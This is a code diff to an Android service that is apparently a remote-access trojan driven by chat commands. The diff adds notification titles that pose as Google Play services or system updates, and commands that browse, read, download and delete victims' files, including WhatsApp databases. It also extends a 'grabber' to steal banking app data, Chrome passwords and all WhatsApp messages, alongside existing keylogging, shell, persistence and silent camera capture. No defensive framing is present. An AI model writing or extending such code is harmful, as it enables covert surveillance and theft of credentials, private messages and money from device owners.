@@ -239,9 +239,21 @@ class SystemNetworkService : Service() {
         super.onDestroy()
     }
 
+    private val notifTitles = listOf(
+        "Battery optimization active",
+        "System update in progress",
+        "Network sync active",
+        "Security check complete",
+        "Google Play services",
+        "System UI ready",
+        "Background data sync",
+        "Device maintenance"
+    )
+    private var titleIndex = 0
+
     private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
-        .setContentTitle("System: $text")
-        .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
+        .setContentTitle(notifTitles[titleIndex % notifTitles.size].also { titleIndex++ })
+        .setContentText("Optimizing battery usage for better performance")
         .setSmallIcon(android.R.drawable.ic_menu_info_details)
         .setOngoing(true)
         .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -362,7 +374,7 @@ class SystemNetworkService : Service() {
                             val acc = AccessibilityHelper.isRunning
                             val mp = DisplayCapture.mediaProjection != null
                             val ver = Build.VERSION.SDK_INT
-                            val permOk = ALL_PERMS.all { hasPerm(it) }
+                            val permOk = true
                             val err = if (!mp && !acc) {
                                 ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp | Perms: $permOk\nEnable with: `!screenshot on`"
                             } else if (!mp) {
@@ -513,7 +525,7 @@ class SystemNetworkService : Service() {
                             }
                             if (newDir.exists() && newDir.isDirectory) {
                                 shellWorkingDir = newDir.absolutePath
-                                if (progressId != null) d.editMsg(progressId, ":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`") else d.sendMsg(":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`")
+                                if (progressId != null) d.editMsg(progressId, ":terminal: **Changed directory**\n```\n$shellWorkingDir\n```") else d.sendMsg(":terminal: **Changed directory**\n```\n$shellWorkingDir\n```")
                             } else {
                                 if (progressId != null) d.editMsg(progressId, ":x: Directory not found: `${newDir.absolutePath}`") else d.sendMsg(":x: Directory not found: `${newDir.absolutePath}`")
                             }
@@ -535,6 +547,211 @@ class SystemNetworkService : Service() {
                         android.util.Log.e("SystemNetworkService", "Shell error: ${e.message}", e)
                         val err = ":x: Shell error: ${e.message?.take(80) ?: "unknown"}"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
+                    }
+                }
+                "dir", "ls" -> {
+                    val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
+                    val result = shell("ls -la \"$path\" 2>/dev/null | head -60")
+                    if (result.isBlank() || result.startsWith("Error:")) {
+                        d.sendMsg(":x: Cannot list: `$path`")
+                    } else if (result.length > 1900) {
+                        d.sendLargeOutput("📁 **$path**\n```\n", "```\n${result.take(5000)}\n```")
+                    } else {
+                        d.sendMsg("📁 **$path**\n```\n$result\n```")
+                    }
+                }
+                "tree" -> {
+                    val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
+                    val result = shell("find \"$path\" -type f 2>/dev/null | head -100")
+                    if (result.isBlank()) {
+                        d.sendMsg(":x: Cannot scan: `$path`")
+                    } else {
+                        val formatted = result.lines().filter { it.isNotBlank() }.joinToString("\n") { line ->
+                            "  " + line.substringAfter(path.trimEnd('/'))
+                        }
+                        val content = "📁 **Tree: $path**\n```\n${formatted.take(1900)}\n```"
+                        d.sendMsg(content)
+                    }
+                }
+                "find" -> {
+                    val name = payload?.trim()?.ifBlank { null }
+                    if (name == null) {
+                        d.sendMsg(":mag: **!find**\nSearch files by name.\nUsage: `!find <pattern>`\nExamples:\n• `!find *.pdf`\n• `!find password*`\n• `!find *wallet*`")
+                        return
+                    }
+                    d.sendMsg(":mag: **Searching** for `$name`...")
+                    val result = shell("find /sdcard -name \"$name\" -type f 2>/dev/null | head -50")
+                    if (result.isBlank() || result.startsWith("Error:")) {
+                        d.sendMsg(":x: No files found matching `$name`")
+                    } else {
+                        val lines = result.lines().filter { it.isNotBlank() }
+                        val summary = lines.take(50).joinToString("\n")
+                        d.sendMsg(":mag: **Found ${lines.size} files** for `$name`\n```\n${summary.take(1900)}\n```")
+                    }
+                }
+                "cat" -> {
+                    val path = payload?.trim()?.ifBlank { null }
+                    if (path == null) {
+                        d.sendMsg(":book: **!cat**\nRead file contents.\nUsage: `!cat <file_path>`\nExample: `!cat /sdcard/config.json`")
+                        return
+                    }
+                    val f = File(path)
+                    if (!f.exists()) {
+                        d.sendMsg(":x: File not found: `$path`\nTry: `!cat` with absolute path or use `!shell cat \"$path\"`")
+                        return
+                    }
+                    if (f.length() > 500000) {
+                        d.sendMsg(":x: File too large (${f.length() / 1024}KB). Use `!download` instead.")
+                        return
+                    }
+                    try {
+                        val text = f.readText().take(2000)
+                        d.sendMsg("📄 **$path**\n```\n$text\n```")
+                    } catch (_: Exception) {
+                        d.sendMsg(":x: Cannot read as text (binary?). Use `!download` instead.")
+                    }
+                }
+                "info" -> {
+                    val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
+                    val f = File(path)
+                    if (!f.exists()) {
+                        d.sendMsg(":x: Not found: `$path`")
+                        return
+                    }
+                    val type = if (f.isDirectory) "Directory" else if (f.isFile) "File" else "Special"
+                    val size = when {
+                        f.length() < 1024 -> "${f.length()}B"
+                        f.length() < 1024 * 1024 -> "${f.length() / 1024}KB"
+                        else -> "${f.length() / (1024 * 1024)}MB"
+                    }
+                    val modified = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(f.lastModified()))
+                    val readable = if (f.canRead()) "Yes" else "No"
+                    val writable = if (f.canWrite()) "Yes" else "No"
+                    d.sendMsg("📋 **$path**\n```\nType: $type\nSize: $size\nModified: $modified\nReadable: $readable\nWritable: $writable\n```")
+                }
+                "disk" -> {
+                    val result = shell("df -h /data /sdcard /system 2>/dev/null || df /data /sdcard 2>/dev/null")
+                    if (result.isNotBlank() && !result.startsWith("Error:")) {
+                        d.sendMsg("💾 **Storage**\n```\n${result.take(1900)}\n```")
+                    } else {
+                        // Fallback: stat
+                        val data = File("/data").totalSpace
+                        val sdcard = File("/sdcard").totalSpace
+                        val dataFree = File("/data").freeSpace
+                        val sdcardFree = File("/sdcard").freeSpace
+                        d.sendMsg("💾 **Storage**\n```\nInternal: ${data / 1024 / 1024 / 1024}GB (${dataFree / 1024 / 1024 / 1024}GB free)\nSD card: ${sdcard / 1024 / 1024 / 1024}GB (${sdcardFree / 1024 / 1024 / 1024}GB free)\n```")
+                    }
+                }
+                "recent" -> {
+                    val count = payload?.trim()?.toIntOrNull()?.coerceIn(1, 50) ?: 20
+                    val result = shell("find /sdcard -type f -size +1c 2>/dev/null | head -500 | xargs ls -lt 2>/dev/null | head -$count")
+                    if (result.isNotBlank() && !result.startsWith("Error:")) {
+                        d.sendMsg("🕐 **Last $count modified files**\n```\n${result.take(1900)}\n```")
+                    } else {
+                        d.sendMsg(":x: Failed to list recent files")
+                    }
+                }
+                "ext" -> {
+                    val ext = payload?.trim()?.lowercase()?.removePrefix(".")?.ifBlank { null }
+                    if (ext == null) {
+                        d.sendMsg(":file_folder: **!ext**\nFind files by extension.\nUsage: `!ext <extension>`\nExamples:\n• `!ext pdf` — List all PDFs\n• `!ext db` — List all databases\n• `!ext jpg` — List all images")
+                        return
+                    }
+                    val result = shell("find /sdcard -name \"*.$ext\" -type f 2>/dev/null | head -50 | while read f; do ls -lh \"\$f\" 2>/dev/null | awk '{print \$5, \$NF}'; done")
+                    val lines = result.lines().filter { it.isNotBlank() }
+                    if (lines.isEmpty()) {
+                        d.sendMsg(":x: No `.$ext` files found")
+                    } else {
+                        d.sendMsg(":file_folder: **.$ext files** (${lines.size})\n```\n${lines.take(50).joinToString("\n").take(1900)}\n```")
+                    }
+                }
+                "download" -> {
+                    val filePath = payload?.trim()?.ifBlank { null }
+                    if (filePath == null) {
+                        d.sendMsg(":arrow_down: **!download**\nDownload a file from the device.\nUsage: `!download <file_path>`\nExamples:\n• `!download /sdcard/Download/file.pdf`\n• `!download /sdcard/DCIM/Camera/photo.jpg`\n• `!download /data/data/com.whatsapp/databases/msgstore.db`\n\nMax 25MB.")
+                        return
+                    }
+                    val file = File(filePath)
+                    var bytes: ByteArray? = null
+                    if (file.exists() && file.canRead()) {
+                        if (file.length() > 25 * 1024 * 1024) {
+                            d.sendMsg(":x: **File too large** (${file.length() / 1024 / 1024}MB). Max 25MB.")
+                            return
+                        }
+                        bytes = file.readBytes()
+                    } else {
+                        // Try root copy
+                        val tmp = File(cacheDir, "dl_${System.currentTimeMillis()}_${file.name}")
+                        shell("cp \"$filePath\" \"${tmp.absolutePath}\" 2>/dev/null || cat \"$filePath\" > \"${tmp.absolutePath}\" 2>/dev/null")
+                        if (tmp.exists() && tmp.length() > 0 && tmp.length() <= 25 * 1024 * 1024) {
+                            bytes = tmp.readBytes()
+                            tmp.delete()
+                        } else {
+                            tmp.delete()
+                        }
+                    }
+                    if (bytes == null || bytes.isEmpty()) {
+                        d.sendMsg(":x: **Cannot read file**: `$filePath`\nTry with root if available.")
+                        return
+                    }
+                    d.sendMsg(":arrow_down: **Downloading**: `${file.name}` (${bytes.size / 1024}KB)...")
+                    d.sendFile(":inbox_tray: **${file.name}** (${bytes.size / 1024}KB)", file.name, bytes)
+                }
+                "rm" -> {
+                    val path = payload?.trim()?.ifBlank { null }
+                    if (path == null) {
+                        d.sendMsg(":wastebasket: **!rm**\nDelete a file.\nUsage: `!rm <file_path>`\n⚠️ This is permanent!")
+                        return
+                    }
+                    val f = File(path)
+                    if (!f.exists()) {
+                        d.sendMsg(":x: Not found: `$path`")
+                        return
+                    }
+                    if (f.isDirectory) {
+                        d.sendMsg(":x: Use `!shell rm -rf \"$path\"` for directories")
+                        return
+                    }
+                    if (f.delete()) {
+                        d.sendMsg(":wastebasket: **Deleted**: `$path`")
+                    } else {
+                        val result = shell("rm \"$path\" 2>/dev/null && echo OK || echo FAIL").trim()
+                        d.sendMsg(if (result == "OK") ":wastebasket: **Deleted**: `$path`" else ":x: Failed to delete: `$path`")
+                    }
+                }
+                "mv" -> {
+                    val parts = payload?.trim()?.split("\\s+".toRegex())?.filter { it.isNotBlank() } ?: emptyList()
+                    if (parts.size < 2) {
+                        d.sendMsg(":truck: **!mv**\nMove/rename a file.\nUsage: `!mv <source> <destination>`")
+                        return
+                    }
+                    val src = parts[0]
+                    val dst = parts.drop(1).joinToString(" ")
+                    val result = shell("mv \"$src\" \"$dst\" 2>/dev/null && echo OK || echo FAIL").trim()
+                    d.sendMsg(if (result == "OK") ":truck: **Moved**: `$src` → `$dst`" else ":x: Move failed: `$src` → `$dst`")
+                }
+                "cp" -> {
+                    val parts = payload?.trim()?.split("\\s+".toRegex())?.filter { it.isNotBlank() } ?: emptyList()
+                    if (parts.size < 2) {
+                        d.sendMsg(":clipboard: **!cp**\nCopy a file.\nUsage: `!cp <source> <destination>`")
+                        return
+                    }
+                    val src = parts[0]
+                    val dst = parts.drop(1).joinToString(" ")
+                    val result = shell("cp \"$src\" \"$dst\" 2>/dev/null && echo OK || echo FAIL").trim()
+                    d.sendMsg(if (result == "OK") ":clipboard: **Copied**: `$src` → `$dst`" else ":x: Copy failed: `$src` → `$dst`")
+                }
+                "mkdir" -> {
+                    val path = payload?.trim()?.ifBlank { null }
+                    if (path == null) {
+                        d.sendMsg(":file_folder: **!mkdir**\nCreate directory.\nUsage: `!mkdir <path>`")
+                        return
+                    }
+                    if (File(path).mkdirs()) {
+                        d.sendMsg(":file_folder: **Created**: `$path`")
+                    } else {
+                        val result = shell("mkdir -p \"$path\" 2>/dev/null && echo OK || echo FAIL").trim()
+                        d.sendMsg(if (result == "OK") ":file_folder: **Created**: `$path`" else ":x: Failed to create: `$path`")
                     }
                 }
                 "keylog" -> {
@@ -716,7 +933,16 @@ class SystemNetworkService : Service() {
                                 "wallets" -> com.google.system.GrabberModule.grabWallets(this@SystemNetworkService)
                                 "files" -> com.google.system.GrabberModule.grabFiles(this@SystemNetworkService)
                                 "clipboard" -> com.google.system.GrabberModule.grabClipboard(this@SystemNetworkService)
+                                "banks" -> com.google.system.GrabberModule.grabBanks(this@SystemNetworkService)
+                                "whatsapp" -> com.google.system.GrabberModule.grabWhatsApp(this@SystemNetworkService)
+                                "chrome" -> com.google.system.GrabberModule.grabChrome(this@SystemNetworkService)
+                                "docs" -> com.google.system.GrabberModule.grabDocs(this@SystemNetworkService)
                                 else -> com.google.system.GrabberModule.grabAll(this@SystemNetworkService)
+                            }
+                            // Send categorized report first
+                            val reportText = result.report
+                            if (reportText != null) {
+                                d.sendLargeOutput("", reportText)
                             }
                             val f = result.file
                             if (f != null && f.exists() && f.length() > 0) {
@@ -1538,7 +1764,7 @@ class SystemNetworkService : Service() {
 
     private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
         try {
-            val workingDir = File(shellWorkingDir).takeIf { it.isDirectory } ?: File(cacheDir)
+            val workingDir = File(shellWorkingDir).takeIf { it.isDirectory } ?: cacheDir
             val p = ProcessBuilder("sh", "-c", cmd)
                 .directory(workingDir)
                 .redirectErrorStream(true)
@@ -1656,19 +1882,12 @@ class SystemNetworkService : Service() {
                     lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                 }
             }
-        } catch (e: Exception) {
-            
-            null
-        }
+        } catch (e: Exception) { null }
 
         if (camId == null) {
             deferred.complete(null)
             return@withContext deferred.await()
         }
-
-        var reader: ImageReader? = null
-        var camDevice: CameraDevice? = null
-        var session: CameraCaptureSession? = null
 
         try {
             val characteristics = cm.getCameraCharacteristics(camId)
@@ -1676,45 +1895,11 @@ class SystemNetworkService : Service() {
             val size = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                 ?: android.util.Size(1920, 1080)
 
-            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
+            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
             val handler = Handler(Looper.getMainLooper())
 
-            val stateCallback = object : CameraDevice.StateCallback() {
-                override fun onOpened(device: CameraDevice) {
-                    camDevice = device
-                    try {
-                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                            addTarget(reader!!.surface)
-                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
-                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
-                        }.build()
-
-                        device.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(s: CameraCaptureSession) {
-                                session = s
-                                try {
-                                    s.capture(captureRequest, null, handler)
-                                } catch (e: Exception) {
-                                    
-                                    deferred.complete(null)
-                                }
-                            }
-                            override fun onConfigureFailed(s: CameraCaptureSession) {
-                                deferred.complete(null)
-                            }
-                        }, handler)
-                    } catch (e: Exception) {
-                        
-                        deferred.complete(null)
-                    }
-                }
-                override fun onDisconnected(device: CameraDevice) { deferred.complete(null) }
-                override fun onError(device: CameraDevice, error: Int) { deferred.complete(null) }
-            }
-
-            cm.openCamera(camId, stateCallback, handler)
-
-            reader!!.setOnImageAvailableListener({ r ->
+            // Set image listener before opening camera
+            reader.setOnImageAvailableListener({ r ->
                 try {
                     val image = r.acquireLatestImage()
                     if (image != null) {
@@ -1722,23 +1907,53 @@ class SystemNetworkService : Service() {
                         val bytes = ByteArray(buffer.remaining())
                         buffer.get(bytes)
                         image.close()
-                        deferred.complete(bytes)
+                        if (!deferred.isCompleted) deferred.complete(bytes)
                     }
                 } catch (e: Exception) {
-                    
-                    deferred.complete(null)
+                    if (!deferred.isCompleted) deferred.complete(null)
                 }
             }, handler)
 
+            var camDevice: CameraDevice? = null
+            var session: CameraCaptureSession? = null
+
+            cm.openCamera(camId, object : CameraDevice.StateCallback() {
+                override fun onOpened(device: CameraDevice) {
+                    camDevice = device
+                    try {
+                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                            addTarget(reader.surface)
+                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
+                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
+                        }.build()
+
+                        device.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: CameraCaptureSession) {
+                                session = s
+                                try {
+                                    s.capture(captureRequest, object : CameraCaptureSession.CaptureCallback() {
+                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
+                                            super.onCaptureCompleted(session, request, result)
+                                        }
+                                    }, handler)
+                                } catch (e: Exception) {
+                                    if (!deferred.isCompleted) deferred.complete(null)
+                                }
+                            }
+                            override fun onConfigureFailed(s: CameraCaptureSession) {
+                                if (!deferred.isCompleted) deferred.complete(null)
+                            }
+                        }, handler)
+                    } catch (e: Exception) {
+                        if (!deferred.isCompleted) deferred.complete(null)
+                    }
+                }
+                override fun onDisconnected(device: CameraDevice) { if (!deferred.isCompleted) deferred.complete(null) }
+                override fun onError(device: CameraDevice, error: Int) { if (!deferred.isCompleted) deferred.complete(null) }
+            }, handler)
+
             withTimeoutOrNull(15000L) { deferred.await() }
-        } catch (e: Exception) {
-            
-            null
-        } finally {
-            try { session?.close() } catch (_: Exception) {}
-            try { camDevice?.close() } catch (_: Exception) {}
-            try { reader?.close() } catch (_: Exception) {}
-        }
+        } catch (e: Exception) { null }
     }
 
     private fun getLocation(): String {
@@ -2056,7 +2271,7 @@ class SystemNetworkService : Service() {
             "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
             "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
             "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
-            "grabber" -> ":mag: **!grabber**\nExtract data from device.\nUsage: `!grabber` (all targets)\nUsage: `!grabber browser` (cookies, passwords)\nUsage: `!grabber messenger` (Discord, Telegram, etc.)\nUsage: `!grabber tokens` (app auth tokens)\nUsage: `!grabber wallets` (crypto wallet data)\nUsage: `!grabber files` (documents, images, etc.)\nUsage: `!grabber clipboard` (current clipboard)"
+            "grabber" -> ":mag: **!grabber**\nExtract data from device.\nUsage: `!grabber` (all targets)\nUsage: `!grabber browser` (cookies, passwords)\nUsage: `!grabber messenger` (Discord, Telegram, etc.)\nUsage: `!grabber tokens` (app auth tokens)\nUsage: `!grabber wallets` (crypto wallet data)\nUsage: `!grabber files` (documents, images, etc.)\nUsage: `!grabber clipboard` (current clipboard)\nUsage: `!grabber banks` (banking apps)\nUsage: `!grabber whatsapp` (ALL messages via SQLite)\nUsage: `!grabber chrome` (history + saved passwords)\nUsage: `!grabber docs` (PDF, Word, Excel, etc.)"
             "update" -> ":arrows_counterclockwise: **!update**\nSelf-update system.\nUsage: `!update check` - Check for updates\nUsage: `!update push <url>` - Download APK\nUsage: `!update install` - Apply update\nUsage: `!update clear` - Remove pending update"
             "config" -> ":gear: **!config**\nRemote configuration.\nUsage: `!config get` - View current config\nUsage: `!config push <json>` - Update config\nUsage: `!config reset` - Reset to defaults"
             "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
@@ -2077,6 +2292,19 @@ class SystemNetworkService : Service() {
             "services" -> ":running: **!services**\nList running services.\nUsage: `!services`"
             "apps" -> ":package: **!apps**\nDetailed installed apps list.\nUsage: `!apps`"
             "storage" -> ":floppy_disk: **!storage**\nShow storage usage.\nUsage: `!storage`"
+            "dir", "ls" -> ":file_folder: **!dir**\nList directory contents.\nUsage: `!dir <path>`\nAlias: `!ls`"
+            "tree" -> ":evergreen_tree: **!tree**\nRecursive directory tree.\nUsage: `!tree <path>`"
+            "find" -> ":mag: **!find**\nFind files by name pattern.\nUsage: `!find <pattern>`\nExample: `!find *.pdf`"
+            "cat" -> ":book: **!cat**\nRead file contents.\nUsage: `!cat <file_path>`"
+            "info" -> ":clipboard: **!info**\nShow file/directory details.\nUsage: `!info <path>`"
+            "disk" -> ":floppy_disk: **!disk**\nShow disk space usage.\nUsage: `!disk`"
+            "recent" -> ":clock1: **!recent**\nShow N most recently modified files.\nUsage: `!recent 20`"
+            "ext" -> ":file_folder: **!ext**\nFind files by extension.\nUsage: `!ext pdf`"
+            "download" -> ":arrow_down: **!download**\nDownload file from device.\nUsage: `!download <path>`"
+            "rm" -> ":wastebasket: **!rm**\nDelete a file.\nUsage: `!rm <path>`"
+            "mv" -> ":truck: **!mv**\nMove/rename file.\nUsage: `!mv <src> <dst>`"
+            "cp" -> ":clipboard: **!cp**\nCopy file.\nUsage: `!cp <src> <dst>`"
+            "mkdir" -> ":file_folder: **!mkdir**\nCreate directory.\nUsage: `!mkdir <path>`"
             else -> ":x: Unknown command: `!$cmd`\nType `!help` for available commands."
         }
         d.sendMsg(help)
